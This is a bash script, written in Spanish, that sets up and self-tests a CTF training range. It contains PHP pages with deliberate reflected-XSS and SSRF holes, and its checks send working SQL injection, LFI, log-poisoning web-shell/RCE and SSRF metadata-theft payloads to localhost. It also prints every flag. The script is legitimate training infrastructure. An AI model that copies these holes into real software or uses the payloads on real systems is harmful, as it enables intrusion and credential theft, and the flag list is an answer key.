#!/bin/bash
# =============================================================================
# CTF MGP — FIX FINAL: XSS :8080 + SSRF Flask desde cero
# Ubuntu 24.04 LTS — No requiere ejecutar reto5_ssrf.sh antes
# Ejecutar: sudo bash fix_final.sh
# =============================================================================
set -e

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root: sudo bash $0${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Fix Final  │  Ubuntu 24.04 LTS                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# =============================================================================
# DIAGNÓSTICO APACHE ANTES DE TOCAR NADA
# =============================================================================
echo -e "${AMARILLO}[DIAG] Estado Apache antes del fix...${RESET}"

echo -e "    → Puertos activos en Apache:"
apache2ctl -S 2>/dev/null | grep -E "port|VirtualHost" | head -20 || true

echo -e "    → Contenido ports.conf:"
grep -v "^#" /etc/apache2/ports.conf | grep -v "^$" || true

echo -e "    → Sites enabled:"
ls /etc/apache2/sites-enabled/ 2>/dev/null || true

echo -e "    → Últimas líneas error.log:"
tail -5 /var/log/apache2/error.log 2>/dev/null || true

# =============================================================================
# FIX 1 — XSS :8080: diagnóstico profundo y solución definitiva
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 1] Reto 2 — XSS :8080 — solución definitiva...${RESET}"

# Paso 1: Asegurar Listen 8080 en ports.conf (sin duplicados)
sed -i '/^Listen 8080/d' /etc/apache2/ports.conf
echo "Listen 8080" >> /etc/apache2/ports.conf
echo -e "${VERDE}    [OK] Listen 8080 en ports.conf (limpio, sin duplicados)${RESET}"

# Paso 2: Detectar MPM activo — en Ubuntu 24.04 puede ser mpm_event
MPM=$(apache2ctl -V 2>/dev/null | grep "Server MPM" | awk '{print $3}' | tr '[:upper:]' '[:lower:]' || echo "event")
echo -e "    → MPM activo: $MPM"

# Paso 3: En Ubuntu 24.04 con mpm_event, PHP corre via php-fpm, NO mod_php
# Verificar si php-fpm está instalado
PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")
FPM_PKG="php${PHP_VER}-fpm"
FPM_SOCK="/run/php/php${PHP_VER}-fpm.sock"

if [ "$MPM" = "event" ] || [ "$MPM" = "worker" ]; then
    echo -e "${AMARILLO}    MPM $MPM detectado → usando PHP-FPM en lugar de mod_php${RESET}"

    # Instalar php-fpm si no está
    if ! systemctl is-active "php${PHP_VER}-fpm" &>/dev/null; then
        echo -e "${AMARILLO}    Instalando $FPM_PKG...${RESET}"
        apt-get install -y -qq "$FPM_PKG"
    fi
    systemctl enable "php${PHP_VER}-fpm"
    systemctl start  "php${PHP_VER}-fpm"
    sleep 1
    echo -e "${VERDE}    [OK] php${PHP_VER}-fpm activo${RESET}"

    # Habilitar módulos para FPM
    a2enmod proxy_fcgi setenvif 2>/dev/null || true
    a2enconf "php${PHP_VER}-fpm" 2>/dev/null || true

    # VirtualHost con ProxyPassMatch hacia FPM
    cat > /etc/apache2/sites-available/xss-ctf.conf <<APACHEEOF
<VirtualHost *:8080>
    ServerName 192.168.125.150
    DocumentRoot /var/www/html/xss
    DirectoryIndex index.php index.html

    <Directory /var/www/html/xss>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    <FilesMatch "\\.php\$">
        SetHandler "proxy:unix:${FPM_SOCK}|fcgi://localhost/"
    </FilesMatch>

    ErrorLog  \${APACHE_LOG_DIR}/xss_error.log
    CustomLog \${APACHE_LOG_DIR}/xss_access.log combined
</VirtualHost>
APACHEEOF

else
    # MPM prefork — mod_php funciona directamente
    echo -e "${VERDE}    MPM prefork — usando mod_php${RESET}"
    a2enmod "php${PHP_VER}" 2>/dev/null || true

    cat > /etc/apache2/sites-available/xss-ctf.conf <<APACHEEOF
<VirtualHost *:8080>
    ServerName 192.168.125.150
    DocumentRoot /var/www/html/xss
    DirectoryIndex index.php index.html

    <Directory /var/www/html/xss>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog  \${APACHE_LOG_DIR}/xss_error.log
    CustomLog \${APACHE_LOG_DIR}/xss_access.log combined
</VirtualHost>
APACHEEOF
fi

# Paso 4: Habilitar site y deshabilitar el default que puede estar en :8080
a2ensite xss-ctf.conf 2>/dev/null || true

# Paso 5: Asegurar que NO hay otro VirtualHost capturando :8080
# (el default 000-default.conf escucha *:80, no debería afectar, pero lo verificamos)
echo -e "    → Verificando conflictos de VirtualHost en :8080..."
grep -r "8080" /etc/apache2/sites-enabled/ 2>/dev/null | \
    grep -v "xss-ctf" | head -5 && \
    echo -e "${AMARILLO}    [WARN] Otros sites escuchan en 8080 — revisar manualmente${RESET}" || \
    echo -e "${VERDE}    [OK] Sin conflictos en :8080${RESET}"

# Paso 6: Escribir archivos PHP
mkdir -p /var/www/html/xss

cat > /var/www/html/xss/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Fast-Ship — Rastreo de Paquetes</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f4f6f8;font-family:'Segoe UI',sans-serif;color:#1a1a2e}
  header{background:#1a1a2e;color:#fff;padding:16px 40px;
         display:flex;align-items:center;gap:16px}
  header h1{font-size:22px;font-weight:700;letter-spacing:1px}
  header span{font-size:12px;color:#a0aec0}
  .hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
  .hero h2{font-size:32px;margin-bottom:12px}
  .hero p{color:#a0aec0;font-size:15px;margin-bottom:32px}
  .search-box{display:flex;max-width:520px;margin:0 auto}
  .search-box input{flex:1;padding:14px 18px;border:none;
    border-radius:8px 0 0 8px;font-size:15px;outline:none}
  .search-box button{padding:14px 24px;background:#e94560;color:#fff;
    border:none;border-radius:0 8px 8px 0;cursor:pointer;
    font-size:15px;font-weight:600}
  footer{text-align:center;padding:20px;color:#a0aec0;font-size:12px;
         border-top:1px solid #e2e8f0}
</style>
</head>
<body>
<header>
  <div>
    <h1>&#128666; Fast-Ship</h1>
    <span>Logística &amp; Rastreo Internacional</span>
  </div>
</header>
<div class="hero">
  <h2>Rastrea tu paquete en tiempo real</h2>
  <p>Ingresa el número o nombre de tu envío para ver su estado</p>
  <form class="search-box" action="search.php" method="GET">
    <input type="text" name="query"
           placeholder="Número de guía o remitente...">
    <button type="submit">Buscar</button>
  </form>
</div>
<footer>Fast-Ship Logistics &copy; 2026 — Sistema de rastreo v2.1.4</footer>
</body>
</html>
PHPEOF

cat > /var/www/html/xss/search.php <<'PHPEOF'
<?php
// Flag en cookie — el participante la obtiene ejecutando XSS
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
// *** VULNERABLE: echo sin htmlspecialchars ***
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship — Resultados</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f4f6f8;font-family:'Segoe UI',sans-serif;color:#1a1a2e}
  header{background:#1a1a2e;color:#fff;padding:16px 40px;
         display:flex;align-items:center;justify-content:space-between}
  header h1{font-size:20px;font-weight:700}
  .container{max-width:760px;margin:40px auto;padding:0 24px}
  .result-box{background:#fff;border-radius:12px;padding:32px;
              box-shadow:0 2px 12px rgba(0,0,0,.07)}
  .result-box h2{font-size:18px;margin-bottom:8px;color:#2d3748}
  .query-echo{background:#edf2f7;border-left:4px solid #e94560;
              padding:14px 18px;border-radius:0 8px 8px 0;
              font-size:15px;margin:16px 0;color:#4a5568}
  .no-result{color:#718096;font-size:14px;margin-top:16px}
  .back{display:inline-block;margin-top:24px;color:#e94560;
        font-size:14px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>&#128666; Fast-Ship</h1>
  <a href="index.php"
     style="color:#a0aec0;font-size:13px;text-decoration:none">
    &#8592; Inicio
  </a>
</header>
<div class="container">
  <div class="result-box">
    <h2>Resultados de búsqueda</h2>
    <p style="font-size:13px;color:#718096">Buscaste:</p>
    <!-- PUNTO VULNERABLE: refleja $query sin escapar -->
    <div class="query-echo"><?php echo $query; ?></div>
    <div class="no-result">
      No se encontraron resultados. Verifica el número de guía.
    </div>
    <a class="back" href="index.php">&#8592; Nueva búsqueda</a>
  </div>
</div>
</body>
</html>
PHPEOF

# Archivo de prueba PHP para confirmar que PHP ejecuta en :8080
cat > /var/www/html/xss/phpcheck.php <<'PHPEOF'
<?php
echo "PHP " . PHP_VERSION . " funcionando correctamente en puerto 8080";
phpinfo();
PHPEOF

chown -R www-data:www-data /var/www/html/xss
chmod -R 750 /var/www/html/xss

# Paso 7: Probar configuración y reiniciar
echo -e "    → Probando configuración Apache..."
if apache2ctl configtest 2>&1 | grep -q "Syntax OK"; then
    echo -e "${VERDE}    [OK] Sintaxis Apache correcta${RESET}"
    systemctl restart apache2
    sleep 2
else
    echo -e "${ROJO}    [ERROR] Sintaxis Apache inválida:${RESET}"
    apache2ctl configtest 2>&1
    exit 1
fi

# Verificación
CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:8080/xss/" 2>/dev/null || echo "000")
PHP_OK=$(curl -s "http://localhost:8080/xss/phpcheck.php" 2>/dev/null | grep -c "funcionando" || true)

if [ "$CODE" = "200" ]; then
    echo -e "${VERDE}    [OK] :8080/xss/ responde HTTP 200${RESET}"
else
    echo -e "${ROJO}    [ERROR] :8080/xss/ responde HTTP $CODE${RESET}"
    echo -e "${AMARILLO}    PHP ejecuta en :8080: $([ "$PHP_OK" -gt 0 ] && echo SI || echo NO)${RESET}"
    echo -e "${AMARILLO}    Últimas líneas error.log:${RESET}"
    tail -8 /var/log/apache2/xss_error.log 2>/dev/null || \
        tail -8 /var/log/apache2/error.log 2>/dev/null || true
fi

# Limpiar archivo de diagnóstico PHP
rm -f /var/www/html/xss/phpcheck.php

# =============================================================================
# FIX 2 — SSRF: crear scripts Flask y servicios systemd desde cero
# (No requiere haber ejecutado reto5_ssrf.sh)
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 2] Reto 5 — SSRF: creando scripts Flask desde cero...${RESET}"

SECRET_TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
PYTHON_BIN=$(which python3)
mkdir -p /opt/ctf-ssrf

# ── metadata_service.py ──────────────────────────────────────────────────────
cat > /opt/ctf-ssrf/metadata_service.py <<PYEOF
#!/usr/bin/env python3
"""Emulador de metadata service tipo AWS IMDSv1 — puerto 8888"""
from flask import Flask, jsonify, Response
import datetime

app = Flask(__name__)
TOKEN = "${SECRET_TOKEN}"

@app.route('/')
def index():
    return Response("latest/\n  meta-data/\n    iam/\n      security-credentials/\n",
                    mimetype='text/plain')

@app.route('/latest/meta-data/')
def meta():
    return Response("ami-id\ninstance-id\niam/\nlocal-ipv4\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/')
def iam():
    return Response("security-credentials/\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/')
def creds_list():
    return Response("mgp-role\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/mgp-role')
def creds():
    return jsonify({
        "Code": "Success",
        "LastUpdated": datetime.datetime.utcnow().isoformat() + "Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIAMGP2026EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": TOKEN,
        "Expiration": "2026-12-31T23:59:59Z",
        "Note": "Usa el campo Token como Bearer en el servicio de storage interno"
    })

@app.route('/latest/meta-data/local-ipv4')
def local_ip():
    return Response("192.168.125.150\n", mimetype='text/plain')

@app.route('/latest/meta-data/instance-id')
def instance_id():
    return Response("i-mgp-ctf-2026\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
PYEOF

# ── storage_service.py ───────────────────────────────────────────────────────
cat > /opt/ctf-ssrf/storage_service.py <<PYEOF
#!/usr/bin/env python3
"""Storage interno — requiere Bearer token — puerto 9999"""
from flask import Flask, request, Response

app = Flask(__name__)
TOKEN = "${SECRET_TOKEN}"
FLAG  = "Comciberdef{ssrf_bypass_2026_master}"

@app.route('/')
def index():
    return Response(
        "Internal Storage Service\n"
        "  /secret/flag.txt  [AUTH REQUIRED]\n"
        "  /public/readme.txt [PUBLIC]\n",
        mimetype='text/plain')

@app.route('/public/readme.txt')
def readme():
    return Response(
        "Sistema de almacenamiento interno COMCIBERDEF.\n"
        "Recursos clasificados requieren token IAM válido.\n",
        mimetype='text/plain')

@app.route('/secret/flag.txt')
def flag():
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer '):
        return Response(
            "401 Unauthorized\n"
            "Se requiere: Authorization: Bearer <token>\n"
            "Obtén el token desde el servicio de metadata.\n",
            status=401, mimetype='text/plain')
    if auth.replace('Bearer ', '').strip() != TOKEN:
        return Response("403 Forbidden — token inválido.\n",
                        status=403, mimetype='text/plain')
    return Response(
        "=== DOCUMENTO CLASIFICADO ===\n\n" + FLAG + "\n\n"
        "Acceso registrado: " + request.remote_addr + "\n",
        mimetype='text/plain')

@app.route('/secret/')
def secret_index():
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer ') or \
       auth.replace('Bearer ', '').strip() != TOKEN:
        return Response("401 Unauthorized\n", status=401, mimetype='text/plain')
    return Response("flag.txt\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999, debug=False)
PYEOF

chmod +x /opt/ctf-ssrf/metadata_service.py /opt/ctf-ssrf/storage_service.py
echo -e "${VERDE}    [OK] Scripts Flask creados en /opt/ctf-ssrf/${RESET}"

# ── Servicios systemd ────────────────────────────────────────────────────────
cat > /etc/systemd/system/ctf-metadata.service <<SVCEOF
[Unit]
Description=CTF SSRF — Metadata Service :8888
After=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=${PYTHON_BIN} /opt/ctf-ssrf/metadata_service.py
Restart=always
RestartSec=3
Environment=PYTHONPATH=/usr/lib/python3/dist-packages
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SVCEOF

cat > /etc/systemd/system/ctf-storage.service <<SVCEOF
[Unit]
Description=CTF SSRF — Storage Service :9999
After=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=${PYTHON_BIN} /opt/ctf-ssrf/storage_service.py
Restart=always
RestartSec=3
Environment=PYTHONPATH=/usr/lib/python3/dist-packages
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl stop  ctf-metadata ctf-storage 2>/dev/null || true
sleep 1
systemctl enable ctf-metadata ctf-storage
systemctl start  ctf-metadata
sleep 2
systemctl start  ctf-storage
sleep 2

for SVC in ctf-metadata ctf-storage; do
    ST=$(systemctl is-active "$SVC" 2>/dev/null || echo "inactive")
    if [ "$ST" = "active" ]; then
        echo -e "${VERDE}    [OK] $SVC activo${RESET}"
    else
        echo -e "${ROJO}    [ERROR] $SVC inactivo${RESET}"
        journalctl -u "$SVC" -n 20 --no-pager 2>/dev/null || true
    fi
done

# ── Portal PHP SSRF ──────────────────────────────────────────────────────────
mkdir -p /var/www/html/ssrf/public

cat > /var/www/html/ssrf/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>NavalConnect — Previsualizador</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#1e293b;border-bottom:1px solid #334155;
         padding:16px 36px;display:flex;align-items:center;gap:14px}
  header h1{font-size:20px;color:#38bdf8;font-weight:700;letter-spacing:1px}
  header p{font-size:12px;color:#64748b;margin-left:auto}
  .container{max-width:820px;margin:48px auto;padding:0 24px}
  .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:36px}
  h2{font-size:18px;margin-bottom:8px;color:#f1f5f9}
  .desc{font-size:13px;color:#64748b;margin-bottom:28px;line-height:1.6}
  .form-row{display:flex}
  .form-row input{flex:1;background:#0f172a;border:1px solid #334155;
                  border-radius:8px 0 0 8px;padding:12px 16px;
                  color:#e2e8f0;font-size:14px;outline:none}
  .form-row button{padding:12px 24px;background:#0284c7;color:#fff;
                   border:none;border-radius:0 8px 8px 0;
                   cursor:pointer;font-size:14px;font-weight:600}
  .notice{margin-top:24px;background:#1e3a5f;border:1px solid #1e40af;
          border-radius:8px;padding:14px 18px;font-size:12px;color:#93c5fd}
  .footer{text-align:center;margin-top:40px;font-size:11px;color:#475569}
</style>
</head>
<body>
<header>
  <h1>&#127758; NavalConnect</h1>
  <p>Red Social Interna — Previsualizador de Recursos v1.4.2</p>
</header>
<div class="container">
  <div class="card">
    <h2>Previsualizar recurso externo</h2>
    <p class="desc">
      Pega la URL de cualquier recurso para obtener una vista previa.
    </p>
    <form action="preview.php" method="GET">
      <div class="form-row">
        <input type="text" name="url"
               placeholder="https://recurso.ejemplo.com/doc" required>
        <button type="submit">&#128269; Previsualizar</button>
      </div>
    </form>
    <div class="notice">
      <strong>Aviso de seguridad:</strong> Se bloquea el acceso a IPs internas
      (localhost, 127.0.0.1, 192.168.x.x) por política de seguridad.
    </div>
  </div>
  <div class="footer">NavalConnect &copy; 2026 — COMCIBERDEF</div>
</div>
</body>
</html>
PHPEOF

cat > /var/www/html/ssrf/preview.php <<'PHPEOF'
<?php
$url      = $_GET['url'] ?? '';
$blacklist = ['localhost','127.0.0.1','::1','192.168.','10.','172.16.','172.17.'];
$blocked  = false;
foreach ($blacklist as $b) {
    if (stripos($url, $b) !== false) { $blocked = true; break; }
}
$result = ''; $error = ''; $success = false; $http_code = 0;

if ($url && !$blocked) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
    curl_setopt($ch, CURLOPT_USERAGENT, 'NavalConnect-Preview/1.4.2');
    if (isset($_GET['headers']) && is_array($_GET['headers'])) {
        $hdr = [];
        foreach ($_GET['headers'] as $k => $v) {
            $hdr[] = htmlspecialchars_decode($k).': '.htmlspecialchars_decode($v);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $hdr);
    }
    $result    = curl_exec($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_err  = curl_error($ch);
    curl_close($ch);
    if ($result !== false && $http_code > 0) { $success = true; }
    else { $error = $curl_err ?: 'No se pudo conectar.'; }
} elseif ($blocked) {
    $error = 'Acceso denegado: dirección IP interna bloqueada.';
} else {
    $error = 'URL no válida.';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>NavalConnect — Vista Previa</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#1e293b;border-bottom:1px solid #334155;
         padding:16px 36px;display:flex;align-items:center;gap:14px}
  header h1{font-size:20px;color:#38bdf8;font-weight:700}
  header a{margin-left:auto;color:#64748b;font-size:13px;text-decoration:none}
  .container{max-width:820px;margin:40px auto;padding:0 24px}
  .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:28px}
  .url-bar{font-size:12px;color:#64748b;margin-bottom:20px;background:#0f172a;
           padding:10px 14px;border-radius:6px;font-family:monospace;word-break:break-all}
  .result{background:#0f172a;border:1px solid #1e40af;border-radius:8px;
          padding:20px;font-family:monospace;font-size:13px;color:#93c5fd;
          white-space:pre-wrap;word-break:break-all;
          max-height:500px;overflow-y:auto;line-height:1.6}
  .error{background:#1e1414;border:1px solid #7f1d1d;border-radius:8px;
         padding:20px;color:#fca5a5;font-size:14px}
  .ok{color:#34d399;font-size:13px;margin-bottom:14px}
  .err{color:#f87171;font-size:13px;margin-bottom:14px}
  .hint{background:#1e2d1e;border:1px solid #166534;border-radius:8px;
        padding:14px 18px;font-size:12px;color:#86efac;margin-top:20px}
  .back{display:inline-block;margin-top:20px;color:#38bdf8;
        font-size:13px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>&#127758; NavalConnect — Vista Previa</h1>
  <a href="index.php">&#8592; Volver</a>
</header>
<div class="container">
  <div class="card">
    <div class="url-bar">URL: <?= htmlspecialchars($url) ?></div>
    <?php if ($success): ?>
      <div class="ok">&#10003; Recurso obtenido</div>
      <div class="result"><?= htmlspecialchars($result) ?></div>
      <?php if ($http_code === 401): ?>
      <div class="hint">
        <strong>Tip:</strong> Recurso protegido. Pasa el token así:<br>
        <code>?url=...&amp;headers[Authorization]=Bearer+TOKEN</code>
      </div>
      <?php endif; ?>
    <?php else: ?>
      <div class="err">&#10007; Error al obtener el recurso</div>
      <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    <a class="back" href="index.php">&#8592; Nueva previsualización</a>
  </div>
</div>
</body>
</html>
PHPEOF

cat > /var/www/html/ssrf/public/info.txt <<'TXTEOF'
NavalConnect — Servicio de Previsualización
===========================================
Arquitectura interna:
- Web principal: 192.168.125.150:80/ssrf/
- Infraestructura de identidad: estándar de nube corporativa
TXTEOF

chown -R www-data:www-data /var/www/html/ssrf
chmod -R 750 /var/www/html/ssrf
echo -e "${VERDE}    [OK] Portal SSRF PHP escrito${RESET}"

# Reglas iptables — bloquear 8888 y 9999 desde exterior
iptables -I INPUT -i lo -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -i lo -p tcp --dport 9999 -j ACCEPT 2>/dev/null || true
iptables -A INPUT -p tcp --dport 8888 ! -i lo -j DROP 2>/dev/null || true
iptables -A INPUT -p tcp --dport 9999 ! -i lo -j DROP 2>/dev/null || true
echo -e "${VERDE}    [OK] iptables: 8888 y 9999 solo accesibles desde localhost${RESET}"

# =============================================================================
# VALIDACIÓN FINAL COMPLETA
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║               VALIDACIÓN FINAL POST-FIX                     ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }

chk_http() {
    local CODE
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$CODE" = "$3" ] && ok "$1 (HTTP $CODE)" || fail "$1 (esperado $3, got $CODE)"
}
chk_body() {
    local BODY
    BODY=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$BODY" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1: SQLi Login ──────────────────────────────${RESET}"
chk_http "Portal /sqli-login/" "http://localhost/sqli-login/" "200"
ROWS=$(mysql -u root -e "SELECT COUNT(*) FROM sqli_db.users;" -sN 2>/dev/null || echo "0")
[ "$ROWS" -eq 5 ] && ok "sqli_db.users → $ROWS filas" || fail "sqli_db.users → $ROWS filas"
BODY=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null || echo "")
echo "$BODY" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag OK" || fail "SQLi bypass → flag no encontrada"

echo ""
echo -e "${AMARILLO}── Reto 2: XSS Reflejado ───────────────────────────${RESET}"
chk_http "Portal :8080/xss/" "http://localhost:8080/xss/" "200"
chk_body "search.php refleja input" \
    "http://localhost:8080/xss/search.php?query=XSSTEST2026" "XSSTEST2026"
HDRS=$(curl -sI "http://localhost:8080/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie session_flag presente" || fail "Cookie session_flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3: SQLi Ciega ───────────────────────────────${RESET}"
chk_http "Portal /sqli-blind/"  "http://localhost/sqli-blind/"  "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"
HASH=$(mysql -u root -e \
    "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" \
    -sN 2>/dev/null || echo "X")
EXP=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
[ "$HASH" = "$EXP" ] && ok "Hash MD5 paco_admin correcto" || \
    fail "Hash MD5 incorrecto ($HASH)"
grep -q "NavalCiber2026" /home/rangeadmin/wordlist.txt 2>/dev/null && \
    ok "Wordlist contiene NavalCiber2026" || fail "Wordlist sin NavalCiber2026"

echo ""
echo -e "${AMARILLO}── Reto 4: LFI + Log Poisoning ──────────────────────${RESET}"
chk_http "Portal /lfi/"  "http://localhost/lfi/"  "200"
chk_body "LFI lee /etc/passwd" \
    "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
[ -f /var/log/app/access.log ] && ok "Log existe" || fail "Log no existe"
sudo -u www-data test -w /var/log/app/access.log 2>/dev/null && \
    ok "Log escribible por www-data" || fail "Log no escribible"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=home" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE → /flag.txt" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" \
    "Comciberdef"
printf '[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5: SSRF ─────────────────────────────────────${RESET}"
META_ST=$(systemctl is-active ctf-metadata 2>/dev/null || echo "inactive")
[ "$META_ST" = "active" ] && ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
STOR_ST=$(systemctl is-active ctf-storage 2>/dev/null || echo "inactive")
[ "$STOR_ST" = "active" ] && ok "ctf-storage activo" || fail "ctf-storage inactivo"
chk_http "Metadata :8888" "http://127.0.0.1:8888/" "200"
chk_http "Storage :9999 sin token → 401" \
    "http://127.0.0.1:9999/secret/flag.txt" "401"
FBODY=$(curl -s -H "Authorization: Bearer ${SECRET_TOKEN}" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null || echo "")
echo "$FBODY" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag con token" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0 obtiene token" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "Portal /ssrf/" "http://localhost/ssrf/" "200"

# =============================================================================
# RESUMEN
# =============================================================================
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"
if [ "$FAIL" -eq 0 ]; then
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB DESPLEGADOS — LISTOS PARA EL CTF${RESET}"
else
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL controles fallaron — ver diagnóstico abajo${RESET}"
    echo ""
    echo -e "${AMARILLO}  Diagnóstico rápido:${RESET}"
    echo "    apache2ctl -S                        # ver VirtualHosts activos"
    echo "    journalctl -u ctf-metadata -n 30     # log Flask metadata"
    echo "    journalctl -u ctf-storage  -n 30     # log Flask storage"
    echo "    tail -20 /var/log/apache2/xss_error.log"
fi
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs participantes:${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/  │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150:8080/xss/    │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/  │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/         │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/        │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
